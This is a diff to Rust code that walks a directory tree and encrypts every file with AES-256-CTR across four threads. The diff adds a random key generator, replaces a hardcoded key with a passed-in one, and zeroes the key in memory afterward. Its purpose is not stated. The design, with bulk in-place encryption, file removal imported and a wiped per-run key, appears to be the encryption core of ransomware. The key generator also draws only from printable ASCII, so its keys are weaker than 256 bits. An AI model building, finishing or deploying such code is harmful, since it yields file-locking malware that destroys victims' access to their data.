@@ -2,14 +2,19 @@ use aes::{
     cipher::{NewCipher, StreamCipher},
     Aes256Ctr,
 };
+use rand::{
+    distributions::Uniform,
+    thread_rng,
+    Rng
+};
 use walkdir::WalkDir;
 
 use std::{
-    path::{Path, PathBuf},
-    sync::mpsc::{channel, Sender},
     fmt::Error as FmtError,
     fs::{remove_file, File, OpenOptions},
     io::{BufReader, Read, Write},
+    path::{Path, PathBuf},
+    sync::mpsc::{channel, Sender},
     thread::{self, JoinHandle},
 };
 
@@ -23,6 +28,15 @@ fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Re
     cipher.apply_keystream(ctext);
 
     Ok(())
+}
+
+pub fn gen_aes_key(key_size: usize) -> String {
+    let rng = thread_rng();
+    rng
+    .sample_iter(&Uniform::new(32, 126))
+    .take(key_size)
+    .map(char::from)
+    .collect()
 }
 
 fn inc_counter(nonce: &mut [u8]) {
@@ -69,7 +83,7 @@ pub enum FileEncryptionDecryptionError {
 
 pub fn encrypt_decrypt_file(
     file_src_path: &str,
-    key: &'static [u8],
+    key: &[u8],
 ) -> Result<u64, FileEncryptionDecryptionError> {
     //Open Source file
     let file_src = match File::open(file_src_path) {
@@ -158,7 +172,7 @@ pub fn encrypt_decrypt_file(
     return Ok(total_read_bytes);
 }
 
-pub fn multi_threaded_encrypt_decrypt_files(directory: &str) {
+pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8]){
     let num_threads = 4;
 
     let mut file_paths: Vec<PathBuf> = Vec::new();
@@ -171,36 +185,41 @@ pub fn multi_threaded_encrypt_decrypt_files(directory: &str) {
                     // Adds file
                     file_paths.push(entry.into_path());
                 }
-            },
-            Err(_) => ()
+            }
+            Err(_) => (),
         };
     }
 
-    
     let mut threads: Vec<JoinHandle<()>> = Vec::new();
     let mut job_senders: Vec<Sender<PathBuf>> = Vec::new();
 
     for _ in 0..num_threads {
+        let mut aes_key_vec = aes_key.to_vec();
         let (tx, rx) = channel::<PathBuf>();
         job_senders.push(tx);
-        //let tx_clone = tx.clone();
-        let thread_handle = thread::spawn(move || loop {
-            match rx.recv() {
-                Ok(path) => {
-                    if path.to_str().unwrap() == "_END_SEARCH_" {
-                        break
+        let thread_handle = thread::spawn(move || 
+            loop {
+                match rx.recv() {
+                    Ok(path) => {
+                        
+                        if path.to_str().unwrap() == "_END_SEARCH_" {
+                            for element in &mut aes_key_vec {
+                                *element = 0;
+                            }
+                            break;
+                        }
+                        match encrypt_decrypt_file(
+                            path.to_str().unwrap(),
+                            &aes_key_vec[..],
+                        ) {
+                            Ok(bytes_read) => bytes_read,
+                            Err(_) => 0,
+                        };
                     }
-                    match encrypt_decrypt_file(
-                        path.to_str().unwrap(),
-                        "J&6#TY5d7deGeB#zd8M3pjoiTb$3oo@G".as_bytes(),
-                    ) {
-                        Ok(bytes_read) => bytes_read,
-                        Err(_) => 0
-                    };
+                    Err(_) => break,
                 }
-                Err(_) => break,
             }
-        });
+        );
         threads.push(thread_handle);
     }
 
@@ -217,7 +236,6 @@ pub fn multi_threaded_encrypt_decrypt_files(directory: &str) {
     for sender in job_senders {
         sender.send(PathBuf::from("_END_SEARCH_")).unwrap();
     }
-
 
     for thread in threads {
         thread.join().unwrap();
